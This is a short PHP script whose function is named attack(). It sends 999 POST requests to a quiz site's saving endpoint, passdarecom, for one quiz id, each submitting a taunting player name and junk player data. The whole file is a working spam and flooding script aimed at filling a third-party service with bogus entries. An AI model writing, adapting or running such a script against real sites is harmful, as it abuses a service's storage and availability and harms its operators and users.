<?php
function attack()
{
    $domain = "https://passdare.com/saving?id=9z54xPB1x01";
    $ch = curl_init($domain);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,"playerName=NoMoreDare😂_SorrySabaAppi_🙏&playerData=asdf");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
    $response = curl_exec($ch);
    print_r($response);
}
    $i = 1;
    $y = 1000;
    while($i<$y)
    {
        attack();
        $i++;
    }
